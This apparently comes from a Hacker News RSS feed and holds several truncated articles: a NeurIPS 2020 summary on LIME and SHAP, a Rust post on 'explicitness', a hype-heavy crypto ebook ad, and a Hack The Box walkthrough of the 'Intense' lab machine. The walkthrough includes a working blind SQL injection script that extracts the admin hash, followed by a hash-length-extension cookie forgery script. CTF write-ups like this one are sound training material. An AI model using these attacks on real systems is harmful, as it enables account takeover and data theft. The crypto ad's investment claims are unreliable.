usually deep models.</p><p>Post hoc explanations come in two flavours: local and global. Local
explanations seek to exlain single examples, e.g. why a single image was
classified as a wolf. Global explanations seek to explain models in their
aggregate behaviour, e.g. in order to expose systematic bias in the model.</p><p>Local explanations can be understood as zooming into a single example and
looking at the decision boundary closest to that example. One family of local
explanations determines which features are important in the prediction for the
given example.</p><p><em>Lime</em> <sup id="fnref-9"><a href="#fn-9">9</a></sup> seeks to generate a sparse linear approximation of the local
decision boundary. As many features as possible are zeroed out in order to
identify the important dimensions, and the regression encodes the relative
importance of those remaining features. This way, we can determine which
features are important in the prediction for the given example.</p><figure><p><svg width="180" height="180"><g transform="translate(0,10)" style="text:[object Object]"><line x1="40" x2="40" y1="0" y2="130" style="text:[object Object]"></line><g transform="translate(40, 0)"><g transform="translate(0, 130)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">0</text></g><g transform="translate(0, 110)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">2</text></g><g transform="translate(0, 90)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">4</text></g><g transform="translate(0, 70)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">6</text></g><g transform="translate(0, 49.99999999999999)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">8</text></g><g transform="translate(0, 29.999999999999993)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">10</text></g><g transform="translate(0, 9.999999999999993)" style="text:[object Object]"><line y1="0" y2="0" x1="6" x2="-6" style="text:[object Object]"></line><text text-anchor="end" dy="0.32em" transform="translate(-14, 0)" style="text:[object Object];font-size:11px;fill:#ee0000">12</text></g></g></g><g transform="translate(40,140)" style="text:[object Object]"><line x1="0" x2="130" y1="0" y2="0" style="text:[object Object]"></line><g transform="translate(0, 0)"><g transform="translate(0, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">2.0</text></g><g transform="translate(26.00000000000002, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">2.2</text></g><g transform="translate(51.999999999999986, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">2.4</text></g><g transform="translate(78.00000000000001, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">2.6</text></g><g transform="translate(103.99999999999997, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">2.8</text></g><g transform="translate(130, 0)" style="text:[object Object]"><line x1="0" x2="0" y1="-6" y2="6" style="text:[object Object]"></line><text text-anchor="middle" dy="0.72em" transform="translate(0, 14)" style="text:[object Object];font-size:11px;fill:#ee0000">3.0</text></g></g></g><path d="M0,130C-5.777777777777778,100.44444444444446,-11.555555555555555,70.88888888888889,0,49.99999999999999C11.555555555555555,29.111111111111093,40.44444444444444,16.88888888888888,65,9.999999999999993C89.55555555555556,3.1111111111111076,109.77777777777777,1.5555555555555538,130,0L130,130C109.77777777777777,130,89.55555555555556,130,65,130C40.44444444444444,130,11.555555555555554,130,0,130C-11.555555555555554,130,-5.777777777777777,130,0,130Z" transform="translate(40,10)" style="opacity:1;stroke:#ee0000;fill:#e27475;stroke-width:3"></path><g transform="translate(40,10)"><circle r="10" cx="51.999999999999986" cy="38.00000000000001" style="opacity:1.0;stroke:#0085ff;fill:#0085ff;stroke-width:2"></circle></g></svg></p><figcaption>Fig 3. Hover or touch 🤔</figcaption></figure><p>As described in the paper, the original decision function <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span></span> (unknown to
LIME), cannot be approximated well by a linear model. The blue circle is the
instance being explained. LIME samples instances, gets predictions using <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span></span>,
and <a href="https://www.youtube.com/watch?v=het9HFqo1TQ">weighs them</a> by the
proximity to the instance being explained (represented here by size). The
straight line is the learned explanation that is locally (but not globally)
faithful; hover to see the effect.</p><p>LIME requires us to decide a bunch of things. First, we have to find some
way to perturb instances around the example we are examining. For an automatic
speech recognition system, we might remove certain frequencies, or perturb the
input audio in high level ways. Then we have to have to determine a distance
function to measure how far away we are from the example we are examining. We
could also choose different feature representations –&nbsp;e.g. pixels, or
superpixels. All these decisions introduce a large number of hyperparameters
that affect how we should understand the explanation.</p><div><p>Note</p><p>🥄  Attempting to summarize NeurIPS is a little bit like setting out to drink the ocean with a teaspoon.</p></div><p><em>Shap</em> <sup id="fnref-10"><a href="#fn-10">10</a></sup>, like LIME, perturbs examples and measures the importance of
individual features for a prediction. The main difference is that the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://feldberlin.com/articles/neurips-2020">https://feldberlin.com/articles/neurips-2020</a></em></p>]]>
            </description>
            <link>https://feldberlin.com/articles/neurips-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725099</guid>
            <pubDate>Mon, 11 Jan 2021 05:48:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intense: Hack the Box Walkthrough]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725013">thread link</a>) | @yaldizseyma
<br/>
January 10, 2021 | https://hackso.me/intense-htb-walkthrough/ | <a href="https://web.archive.org/web/*/https://hackso.me/intense-htb-walkthrough/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">

<div id="unencrypted_content">
<article>
<p>This post documents the complete walkthrough of Intense, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/261">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/19014">sokafr</a>, and hosted at <a href="https://www.hackthebox.eu/">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>

<h2 id="on-this-post">On this post</h2>
<ul id="markdown-toc">
<li><a href="#background" id="markdown-toc-background">Background</a></li>
<li>
<a href="#information-gathering" id="markdown-toc-information-gathering">Information Gathering</a> <ul>
<li><a href="#simple-network-management-protocol" id="markdown-toc-simple-network-management-protocol">Simple Network Management Protocol</a></li>
<li><a href="#hypertext-transfer-protocol" id="markdown-toc-hypertext-transfer-protocol">Hypertext Transfer Protocol</a></li>
<li><a href="#source-code-review" id="markdown-toc-source-code-review">Source Code Review</a></li>
<li><a href="#database-schema" id="markdown-toc-database-schema">Database Schema</a></li>
<li><a href="#sql-injection" id="markdown-toc-sql-injection">SQL Injection</a></li>
<li><a href="#hash-length-extension-attack" id="markdown-toc-hash-length-extension-attack">Hash Length Extension Attack</a></li>
<li>
<a href="#listing-and-reading-files" id="markdown-toc-listing-and-reading-files">Listing and reading files</a> <ul>
<li><a href="#list-files" id="markdown-toc-list-files">List files</a></li>
<li><a href="#read-files" id="markdown-toc-read-files">Read files</a></li>
</ul>
</li>
<li><a href="#getting-usertxt" id="markdown-toc-getting-usertxt">Getting <code>user.txt</code></a></li>
<li><a href="#net-snmpd-write-access-snmp-extend-mib-arbitrary-code-execution" id="markdown-toc-net-snmpd-write-access-snmp-extend-mib-arbitrary-code-execution">Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution</a></li>
</ul>
</li>
<li><a href="#foothold" id="markdown-toc-foothold">Foothold</a></li>
<li>
<a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a> <ul>
<li><a href="#port-forwarding" id="markdown-toc-port-forwarding">Port Forwarding</a></li>
<li><a href="#file-analysis-of-note_server" id="markdown-toc-file-analysis-of-note_server">File Analysis of <code>note_server</code></a></li>
<li><a href="#vulnerability-analysis-of-note_server" id="markdown-toc-vulnerability-analysis-of-note_server">Vulnerability Analysis of <code>note_server</code></a></li>
<li><a href="#exploit-development-of-note_server" id="markdown-toc-exploit-development-of-note_server">Exploit Development of <code>note_server</code></a></li>
<li><a href="#getting-roottxt" id="markdown-toc-getting-roottxt">Getting <code>root.txt</code></a></li>
</ul>
</li>
</ul>
<h2 id="background">Background</h2>
<p>Intense is a retired vulnerable VM from Hack The Box.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>Letâ€™s start with a <code>masscan</code> probe to establish the open ports in the host.</p>
<div><div><pre><code># masscan -e tun0 -p1-65535,U:1-65535 10.10.10.195 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-06 04:45:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.195
Discovered open port 161/udp on 10.10.10.195
Discovered open port 80/tcp on 10.10.10.195
</code></pre></div></div>
<p>It appears that we have SNMP. Letâ€™s do one better with <code>nmap</code> scanning the discovered ports to establish their services.</p>
<div><div><pre><code># nmap -n -v -Pn -sS -sU -pT:22,80,U:161 -A --reason 10.10.10.195 -oN nmap.txt
...
PORT    STATE SERVICE REASON              VERSION
22/tcp  open  ssh     syn-ack ttl 63      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp  open  http    syn-ack ttl 63      nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: f20383648c26d05d00000000
|   snmpEngineBoots: 624
|_  snmpEngineTime: 3m45s
| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
|_  System uptime: 3m45.15s (22515 timeticks)
</code></pre></div></div>
<p>Awesome. Looks like we really have SNMP on our hands.</p>
<h3 id="simple-network-management-protocol">Simple Network Management Protocol</h3>
<p>Letâ€™s see what we can find with <code>snmp-check</code>.</p>
<div><div><pre><code># snmp-check -c public 10.10.10.195
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.195:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.195
  Hostname                      : intense
  Description                   : Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
  Contact                       : Me &lt;<a href="https://hackso.me/cdn-cgi/l/email-protection" data-cfemail="384d4b5d4a7851564c5d564b5d16504c5a">[email&nbsp;protected]</a>&gt;
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 02:22:39.70
  Uptime system                 : 00:02:46.02
  System date                   : 2020-7-6 09:57:48.0

</code></pre></div></div>
<p>Nothing useful it seems.</p>
<h3 id="hypertext-transfer-protocol">Hypertext Transfer Protocol</h3>
<p>Hereâ€™s what the <code>http</code> service looks like.</p>
<p><a href="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png">
<img src="https://res.cloudinary.com/limbernie/image/upload/w_480,c_lpad,g_west,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png" alt="" data-src="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png" data-srcset="https://res.cloudinary.com/limbernie/image/upload/w_480,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png 480w,  		 	 https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png">

</a></p>
<p>Upon logging in with (<code>guest:guest</code>), this is what I get.</p>
<p><a href="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png">
<img src="https://res.cloudinary.com/limbernie/image/upload/w_480,c_lpad,g_west,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png" alt="" data-src="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png" data-srcset="https://res.cloudinary.com/limbernie/image/upload/w_480,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png 480w,  		 	 https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png">

</a></p>
<p>The creator was kind enough to leave the source code of the web application at <code>/src.zip</code>.</p>
<h3 id="source-code-review">Source Code Review</h3>
<p>I noticed <code>/submitmessage</code> is the only route that doesnâ€™t require authentication, so this has a high chance of being the way in.</p>
<p><a href="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/bdf91824.png">
<img src="https://res.cloudinary.com/limbernie/image/upload/w_480,c_lpad,g_west,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/bdf91824.png" alt="" data-src="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/bdf91824.png" data-srcset="https://res.cloudinary.com/limbernie/image/upload/w_480,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/bdf91824.png 480w,  		 	 https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/bdf91824.png">

</a></p>
<p>Notice the use of Python format string operation instead of parameter substitution? According to Pythonâ€™s <code>sqlite3</code> <a href="https://docs.python.org/3.8/library/sqlite3.html">module</a>,</p>
<blockquote>
<p>You shouldnâ€™t assemble your query using Pythonâ€™s string operations because doing so is insecure; it makes your program vulnerable to an SQL injection attack.</p>
</blockquote>
<p>The only caveats are: 1) the SQL injection string must not be more than 140 characters long and 2) it must not contain these words.</p>
<p><a href="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png">
<img src="https://res.cloudinary.com/limbernie/image/upload/w_480,c_lpad,g_west,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png" alt="" data-src="https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png" data-srcset="https://res.cloudinary.com/limbernie/image/upload/w_480,f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png 480w,  		 	 https://res.cloudinary.com/limbernie/image/upload/f_auto,q_auto/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png">

</a></p>
<h3 id="database-schema">Database Schema</h3>
<p>This is the schema I got from reading the source code.</p>
<div><div><pre><code>CREATE TABLE users(
username TEXT NOT NULL,
secret TEXT NOT NULL,
role INT NOT NULL);
CREATE TABLE messages(
message text not null);
</code></pre></div></div>
<h3 id="sql-injection">SQL Injection</h3>
<p>By making use of the following SQL injection payload, I was able to tease out <code>admin</code>â€™s <code>secret</code> hash (SHA256 of the password) from the <code>users</code> table. <code>admin</code> has a role of 1, obviously.</p>
<p><span>get_secret.sh</span></p>
<div><div><pre><code><span>#!/bin/bash</span>

<span>HOST</span><span>=</span>10.10.10.195
<span>PORT</span><span>=</span>80

<span># query database</span>
<span>function </span>query<span>()</span> <span>{</span>
    <span>local </span><span>pos</span><span>=</span><span>"</span><span>$1</span><span>"</span>
    <span>local </span><span>chr</span><span>=</span><span>"</span><span>$2</span><span>"</span>
    <span>local </span><span>err</span><span>=</span><span>"zeroblob(999999999)"</span>
    <span>local </span><span>payload</span><span>=</span><span>"'||(select case when substr((select secret from users where role=1),POS,1)='CHR' then ERR else 1 end from users))--"</span>
    <span>payload</span><span>=</span><span>"</span><span>${</span><span>payload</span><span>/POS/</span><span>$pos</span><span>}</span><span>"</span>
    <span>payload</span><span>=</span><span>"</span><span>${</span><span>payload</span><span>/CHR/</span><span>$chr</span><span>}</span><span>"</span>
    <span>payload</span><span>=</span><span>"</span><span>${</span><span>payload</span><span>/ERR/</span><span>$err</span><span>}</span><span>"</span>
    <span>local </span><span>result</span><span>=</span><span>$(</span>curl <span>-s</span> <span>\</span>
                        <span>--data-urlencode</span> <span>"message=</span><span>${</span><span>payload</span><span>}</span><span>"</span> <span>\</span>
                        http://<span>$HOST</span>:<span>$PORT</span>/submitmessage<span>)</span>
    <span>echo</span> <span>$result</span>
<span>}</span>

<span>SECRET</span><span>=</span><span>""</span>

<span># SHA256 has 64 characters; and each character should be [0-9a-f]</span>
<span>for </span>pos <span>in</span> <span>$(</span><span>seq </span>64<span>)</span><span>;</span> <span>do
    for </span>chr <span>in</span> <span>{</span>0..9<span>}</span> <span>{</span>a..f<span>}</span><span>;</span> <span>do
        if</span> <span>[</span> <span>"</span><span>$(</span>query <span>$pos</span> <span>$chr</span><span>)</span><span>"</span> <span>!=</span> <span>"OK"</span> <span>]</span><span>;</span> <span>then
            </span><span>SECRET</span><span>=</span><span>"</span><span>${</span><span>SECRET</span><span>}${</span><span>chr</span><span>}</span><span>"</span>
            <span>break
        </span><span>fi
    done
    </span><span>printf</span> <span>"%02d: %s</span><span>\n</span><span>"</span> <span>"</span><span>$pos</span><span>"</span> <span>"</span><span>$SECRET</span><span>"</span>
<span>done</span>
</code></pre></div></div>
<p>Letâ€™s run it, shall we?</p>
<div><div><pre><code># ./get_secret.sh
01: f
02: f1
03: f1f
04: f1fc
05: f1fc1
06: f1fc12
07: f1fc120
08: f1fc1201
09: f1fc12010
10: f1fc12010c
11: f1fc12010c0
12: f1fc12010c09
13: f1fc12010c094
14: f1fc12010c0940
15: f1fc12010c09401
16: f1fc12010c094016
17: f1fc12010c094016d
18: f1fc12010c094016de
19: f1fc12010c094016def
20: f1fc12010c094016def7
21: f1fc12010c094016def79
22: f1fc12010c094016def791
23: f1fc12010c094016def791e
24: f1fc12010c094016def791e1
25: f1fc12010c094016def791e14
26: f1fc12010c094016def791e143
27: f1fc12010c094016def791e1435
28: f1fc12010c094016def791e1435d
29: f1fc12010c094016def791e1435dd
30: f1fc12010c094016def791e1435ddf
31: f1fc12010c094016def791e1435ddfd
32: f1fc12010c094016def791e1435ddfdc
33: f1fc12010c094016def791e1435ddfdca
34: f1fc12010c094016def791e1435ddfdcae
35: f1fc12010c094016def791e1435ddfdcaec
36: f1fc12010c094016def791e1435ddfdcaecc
37: f1fc12010c094016def791e1435ddfdcaeccf
38: f1fc12010c094016def791e1435ddfdcaeccf8
39: f1fc12010c094016def791e1435ddfdcaeccf82
40: f1fc12010c094016def791e1435ddfdcaeccf825
41: f1fc12010c094016def791e1435ddfdcaeccf8250
42: f1fc12010c094016def791e1435ddfdcaeccf8250e
43: f1fc12010c094016def791e1435ddfdcaeccf8250e3
44: f1fc12010c094016def791e1435ddfdcaeccf8250e36
45: f1fc12010c094016def791e1435ddfdcaeccf8250e366
46: f1fc12010c094016def791e1435ddfdcaeccf8250e3663
47: f1fc12010c094016def791e1435ddfdcaeccf8250e36630
48: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c
49: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0
50: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0b
51: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc
52: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc9
53: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93
54: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc932
55: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc9328
56: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285
57: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c
58: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2
59: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c29
60: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c297
61: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971
62: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c29711
63: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c297110
64: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
</code></pre></div></div>
<p>Sweet.</p>
<h3 id="hash-length-extension-attack">Hash Length Extension Attack</h3>
<p>Too bad I could not crack the hash to recover the password. However, we can replay a session to gain access as <code>admin</code>. According to the source, the session is encoded as a cookie in this format.</p>
<div><div><pre><code><span>def</span> <span>create_cookie</span><span>(</span><span>session</span><span>):</span>
    <span>cookie_sig</span> <span>=</span> <span>sign</span><span>(</span><span>session</span><span>)</span>
    <span>return</span> <span>b64encode</span><span>(</span><span>session</span><span>)</span> <span>+</span> <span>b'.'</span> <span>+</span> <span>b64encode</span><span>(</span><span>cookie_sig</span><span>)</span>
</code></pre></div></div>
<p>The part before the dot is the session and the part after the dot is the signature. The session is no more than the the key-value pair of <code>user=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;</code>. The signature is the SHA256 hash of a random secret between 8 and 15 characters, concatenated with the session.</p>
<p>According to <a href="https://en.wikipedia.org/wiki/Length_extension_attack">Wikipedia</a>,</p>
<blockquote>
<p>In cryptography and computer security, a <strong>length extension attack</strong> is a type of attack where an attacker can use <strong>Hash</strong>(<em>message1</em>) and the length of <em>message1</em> to calculate <strong>Hash</strong>(<em>message1</em> â€– <em>message2</em>) for an attacker-controlled <em>message2</em>, without needing to know the content of <em>message1</em>.</p>
</blockquote>
<p>Check out the <code>sign</code> function.</p>
<div><div><pre><code><span>def</span> <span>sign</span><span>(</span><span>msg</span><span>):</span>
	<span>""" Sign message with secret key """</span>
	<span>return</span> <span>sha256</span><span>(</span><span>SECRET</span> <span>+</span> <span>msg</span><span>).</span><span>digest</span><span>()</span>
</code></pre></div></div>
<p>Looks like we have all the known variables to launch this attack to get the signature. Armed with this insight, I wrote a simple script thatâ€™ll generate all valid cookies for the random secret between 8 and 15 characters. The main driver doing all the heavy lifting for this script is <a href="https://github.com/iagox86/hash_extender"><code>hash_extender</code></a>.</p>
<p><span>get_cookie.sh</span></p>
<div><div><pre><code><span>#!/bin/bash</span>

<span>HOST</span><span>=</span>10.10.10.195
<span>PORT</span><span>=</span>80
<span>LEN</span><span>=</span><span>$1</span>

<span>COOKIE</span><span>=</span><span>$(</span>curl <span>-i</span> <span>\</span>
              <span>-s</span> <span>\</span>
              <span>-d</span> <span>"username=guest&amp;password=guest"</span> <span>\</span>
              http://<span>$HOST</span>:<span>$PORT</span>/postlogin <span>\</span>
         | <span>grep</span> <span>-E</span> <span>'Set-Cookie'</span> <span>\</span>
         | <span>sed</span> <span>'s/Set-Cookie: //'</span> <span>\</span>
         | <span>cut</span> <span>-d</span><span>';'</span> <span>-f1</span> <span>\</span>
         | <span>sed</span> <span>'s/auth=//'</span><span>)</span>

<span>DATA</span><span>=</span><span>$(</span><span>cut</span> <span>-d</span><span>'.'</span> <span>-f1</span> <span>&lt;&lt;&lt;</span><span>$COOKIE</span> | <span>base64</span> <span>-d</span><span>)</span>
<span>SIGN</span><span>=</span><span>$(</span><span>cut</span> <span>-d</span><span>'.'</span> <span>-f2</span> <span>&lt;&lt;&lt;</span><span>$COOKIE</span> | <span>base64</span> <span>-d</span> | xxd <span>-p</span> | <span>tr</span> <span>-d</span> <span>'\n'</span><span>)</span>

<span>SECRET</span><span>=</span>f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
<span>APPEND</span><span>=</span><span>";username=admin;secret=</span><span>${</span><span>SECRET</span><span>}</span><span>;"</span>

<span>for </span>LEN <span>in</span> <span>$(</span><span>seq </span>8 15<span>)</span><span>;</span> <span>do
    </span><span>HASH</span><span>=</span><span>$(</span>./hash_extender <span>-d</span> <span>$DATA</span> <span>\</span>
                           <span>-a</span> <span>$APPEND</span> <span>\</span>
                           <span>-s</span> <span>$SIGN</span> <span>\</span>
                           <span>-l</span> <span>$LEN</span><span>)</span></code></pre></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hackso.me/intense-htb-walkthrough/">https://hackso.me/intense-htb-walkthrough/</a></em></p>]]>
            </description>
            <link>https://hackso.me/intense-htb-walkthrough/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725013</guid>
            <pubDate>Mon, 11 Jan 2021 05:37:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The ABCs of Cryptocurrencies]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25724824">thread link</a>) | @hgarg
<br/>
January 10, 2021 | https://flurly.com/s/harishgarg/ABCsofCrypto | <a href="https://web.archive.org/web/*/https://flurly.com/s/harishgarg/ABCsofCrypto">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><h2>Do you remember Bitcoin breaking records with how fast it was gaining in value?

Do you remember wanting to join in on the profits, but didn't know where to start?

The ABCs of Cryptocurrency takes you through my experience of becoming an investor in the Blockchain and Cryptocurrency market, as well as instructions on how you can get started investing in Bitcoin, Ethereum, Ripple, and other hot cryptocurrencies TODAY. The window to get invested early in this market won't last forever. Find out how you can get involved with your purchase of The ABCs of Cryptocurrency.

This book will teach you:

💰How to invest in Bitcoin and other cryptocurrencies

💰How to stake your cryptocurrency for passive, residual income

💰The proper and safe way to hold cryptocurrency

Don’t get left behind the next time Bitcoin goes to $20,000...or more 👀

Let’s hit the moon together 🚀

© 2020 Mashfik Ahmed</h2></p></div></div>]]>
            </description>
            <link>https://flurly.com/s/harishgarg/ABCsofCrypto</link>
            <guid isPermaLink="false">hacker-news-small-sites-25724824</guid>
            <pubDate>Mon, 11 Jan 2021 05:10:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things 'Explicit' Is Not]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25724778">thread link</a>) | @pcr910303
<br/>
January 10, 2021 | https://boats.gitlab.io/blog/post/2017-12-27-things-explicit-is-not/ | <a href="https://web.archive.org/web/*/https://boats.gitlab.io/blog/post/2017-12-27-things-explicit-is-not/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <article role="main">
        

<p>Oftentimes when I am conversing about the design of Rust with other users - as
on <a href="https://github.com/rust-lang/rfcs">RFCs</a> or the <a href="https://internals.rust-lang.org/">internals forum</a> - I witness a peculiar
remark about “explicitness.” It usually goes something like this:</p>

<blockquote>
<p>I do not like <code>Feature Design X</code> because it is too implicit. Magic is okay in
<code>Other Language Y</code>, but Rust is supposed to be an explicit language, so we
should go with <code>Feature Design Z</code> instead.</p>
</blockquote>

<p>I’ve come to strongly dislike these comments, because they contain very little
actionable feedback. They simply assert that “explicit is better than implicit”
(an assumption that we are all supposed to accept unquestioningly), and that a
particular design is less explicit than an alternative (often without even
explaining <em>how</em> they find it less explicit), and therefore the alternative is
clearly preferable.</p>

<p>In a blog post earlier this year, Aaron tried to dig into the question of
explicitness with a discussion of the <a href="https://blog.rust-lang.org/2017/03/02/lang-ergonomics.html">reasoning
footprint</a>. He attempted to break down the components of
explicitness and implicitness so that we could perform a more nuanced
assessment of “how implicit” a language feature is. I want to do a sort of
orthogonal breakdown, and try to divide up the space of what we often mean when
we use the word “explicit.”</p>

<p>English is a very fuzzy language, so every adjective has a variety of
different, highly contextual definitions (for example: the way I just used
“fuzzy” in this sentence). Explicit is no different, so I cannot say that
anyone is using the word “explicit” <em>incorrectly</em>. But I can suggest that we
try to use more targeted language when we talk about explicitness, so that we
can have a more precise conversation about what our concerns are.</p>



<p>Sometimes in frustration at “explicit is better than implicit” I am tempted to
take the opposite position just to be contrarian - explicitness is bad,
implicitness is better. In reality I do think that Rust is an uncommonly
